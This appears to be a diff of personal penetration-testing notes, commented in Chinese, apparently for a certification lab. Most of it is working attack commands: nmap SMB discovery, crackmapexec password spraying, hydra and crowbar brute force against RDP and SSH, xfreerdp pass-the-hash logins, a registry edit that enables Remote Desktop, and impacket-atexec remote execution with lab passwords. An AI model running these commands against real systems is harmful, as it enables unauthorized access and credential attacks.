@@ -139,6 +139,7 @@ TCP 139,445
 nmap -iL -p445 -sVC
 nmap --script smb-os-discovery,smb-protocols
 nmap 192.168.0.* -p445 --open -n -Pn -oG - | grep Up | cut -d ' ' -f2 > ip_smb
+nmap -iL smb_list.txt -n -Pn -p445 -sV --script smb-os-discovery,smb-protocols
 ```
 Crack Password
 ```bash
@@ -151,7 +152,7 @@ python3 -m pip install --upgrade impacket
 crackmapexec smb ip_smb -u administrator -p $passwordlist | grep 'Pwn3d!'
 
 # 密碼噴灑
-crackmapexec smb 192.168.0.7 -u userlist. -p $password --continue-on-success
+crackmapexec smb 192.168.0.7 -u userlist.txt -p $password --continue-on-success
 ```
 Access
 ```bash
@@ -177,6 +178,9 @@ TCP 3389
 ```
 Crack
 ```bash
+# hydra
+hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'
+
 # crowbar
 sudo apt install -y crowbar 
 git clone https://github.com/galkan/crowbar
@@ -184,14 +188,14 @@ apt-get install -y nmap openvpn freerdp-x11 vncviewer
 # -v: 輸出詳細資訊
 crowbar [-v] -b rdp -s <IP/CIDR> -u user -c password
 crowbar [-v] -b rdp -s <IP/CIDR> -U Users.txt -C Passwords.txt
+crowbar -b rdp -s 192.168.0.7/32 -u administrator -C Passwords.txt
 
-# hydra
-hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'
+tail crowbar.log # 進度 因為crowbar預設再背景跑 
 ```
 xfreerdp
 ```bash
 # Environment
-sudo dpkg –l | grep freerdp
+sudo dpkg -l | grep freerdp
 # 以下全部都要2.3version以上
 freerdp2-x11
 libfreerdp2-2
@@ -209,6 +213,8 @@ xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
 reg
 ```bash
 # Windows遠桌開關
+
+# 1為關  0為開
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
@@ -237,4 +243,11 @@ hydra -t 4 -l administrator -p 'Infinit3' ssh://192.168.0.70
 # 如果看到題目的靶機是這個平臺的，很常用這組密碼，可以試試看
 # https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki
 Pa$$w0rd123
+```
+
+# Cheatsheet
+```bash
+impacket-atexec CPNETCPNET.LOCALNET/cpent:Pa\$\$w0rd123@127.0.0.1 "certutil -hashfile C:\\Users\\Administrator\\adminflag.txt SHA256"
+
+impacket-atexec administrator:1234567@172.25.30.4 "dir C:\\Users\\Administrator\\Documents\\"
 ```
